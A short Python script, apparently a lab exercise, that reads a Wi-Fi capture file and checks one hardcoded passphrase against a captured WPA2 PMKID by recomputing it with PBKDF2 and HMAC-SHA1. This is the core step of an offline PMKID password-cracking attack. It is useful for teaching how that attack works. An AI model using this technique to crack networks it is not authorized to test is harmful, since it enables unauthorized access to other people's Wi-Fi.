#!/usr/bin/env python

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

packets = rdpcap("PMKID_handshake.pcap")

ssid        = packets[126].info.decode("utf-8")
APmac       = a2b_hex(packets[145].addr3.replace(':',''))
Clientmac   = a2b_hex(packets[145].addr1.replace(':',''))
pmkid       = a2b_hex("7fd0bc061552217e942d19c6686f1598")[:6]

passPhrase = "admin123"

pmk = pbkdf2(hashlib.sha1, str.encode(passPhrase), str.encode(ssid), 4096, 32)

computed_pmkid = hmac.new(pmk,str.encode("PMK Name")+APmac+Clientmac,hashlib.sha1).digest()[:6]

print("real pmkid : ", b2a_hex(pmkid))
print("computed pmkid : ", b2a_hex(computed_pmkid))

if b2a_hex(pmkid) == b2a_hex(computed_pmkid):
    print("The key was found ! It is : ", passPhrase)